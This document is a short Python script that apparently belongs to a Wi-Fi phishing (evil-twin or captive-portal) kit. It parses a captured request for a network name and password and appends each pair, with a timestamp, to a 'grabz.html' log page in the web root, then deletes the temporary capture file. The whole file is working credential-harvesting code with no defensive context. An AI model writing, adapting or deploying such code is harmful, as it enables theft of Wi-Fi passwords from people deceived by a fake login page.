#!/usr/bin/python3
from time import strftime, localtime
from os import remove


# read data from tmp.txt
def read_data():
    with open("tmp.txt", 'r') as fp:
        data = fp.read()
    return data
# filter and clean data
def filter_data(data):
    wifi_ssd = ""
    wifi_password = ""
    data = data.split("?")[1]
    wifi_ssd, wifi_password = data.split("&")
    wifi_ssd = wifi_ssd.split("=")[1]
    wifi_password = wifi_password.split("=")[1]
    return wifi_ssd, wifi_password
        
# write data to grabz.html
def write_grab(wifi_ssd, wifi_password):
    curr_time = localtime()
    curr_clock = strftime("%d/%m/%Y @ %H:%M:%S", curr_time)
    with open("webroot/grabz.html", 'r') as fp:
        page = fp.read()
    new_page = ""
    fresh = True
    for line in page.split("\n"):
        if "<p>" in line and fresh:
            fresh = False
            tabs = line.split("<")[0]
            grab = f"<p>{curr_clock} - {wifi_ssd} : {wifi_password}</p>\n"
            new_page = new_page + tabs + grab
        new_page = new_page + line + "\n"
    with open("webroot/grabz.html", 'w') as fp:
        fp.write(new_page)
    remove("tmp.txt")
if __name__ == '__main__':
    data = read_data()
    wifi_ssd, wifi_password = filter_data(data)
    write_grab(wifi_ssd, wifi_password)
